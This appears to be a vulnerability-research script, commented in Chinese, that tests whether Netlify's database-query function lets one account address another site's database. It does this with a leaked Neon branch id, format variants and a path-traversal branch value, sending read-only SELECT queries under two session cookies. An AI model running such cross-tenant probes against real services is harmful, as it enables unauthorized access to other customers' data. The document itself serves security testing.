# -*- coding: utf-8 -*-
"""② 参数透传验证:database-query branchId 接受 Neon 原生 br-xxx 格式?
已知:snapshots 响应泄露 Neon 原生分支 id(br-holy-bar-aekgctv2 = B 的 production)
若 backend 直接透传 br-xxx 而不过 site->branch 映射 -> 跨 site 寻址
矩阵:格式变体 x site 归属;全部只读 select
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B, SITE_A

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
BR_NEON_B = 'br-holy-bar-aekgctv2'   # B 的 Neon 原生分支 id(泄露自 B snapshots)
ctx = ssl.create_default_context()


def dbq(cookie, body, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': cookie}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    try:
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st, out = r.status, raw[:400].decode('utf-8', 'ignore')
    except Exception as e:
        st, out = -1, 'EXC %r' % e
    finally:
        conn.close()
    return st, out


def t(label, cookie, site, branch):
    body = {'siteId': site, 'branchId': branch, 'action': 'query',
            'sql': 'select current_user::text, inet_server_addr()::text'}
    st, out = dbq(cookie, body)
    print('%-46s [%d] %s' % (label, st, out.replace('\n', ' | ')[:260]))


SQL = 'select current_user::text'
print('== A 自属基线 ==')
t('A + production(基线)', COOKIE_A, SITE_A, 'production')
t('A + no-such-branch(基线404)', COOKIE_A, SITE_A, 'no-such-branch-xyz')
print()
print('== Neon 原生 br-xxx 格式 ==')
t('A + br-holy-bar-aekgctv2(B的)', COOKIE_A, SITE_A, BR_NEON_B)
t('B + br-holy-bar-aekgctv2(自属)', COOKIE_B, SITE_B, BR_NEON_B)
t('A + br-no-such-xxx', COOKIE_A, SITE_A, 'br-no-such-xxx')
print()
print('== 其他格式变体(UUID/deploy id/数字)==')
t('A + uuid格式', COOKIE_A, SITE_A, '6a98d064b7a2d072ed510d0b')
t('A + 数字格式', COOKIE_A, SITE_A, '12345')
t('A + 大写PRODUCTION', COOKIE_A, SITE_A, 'PRODUCTION')
t('A + production/extra', COOKIE_A, SITE_A, 'production/../../production')
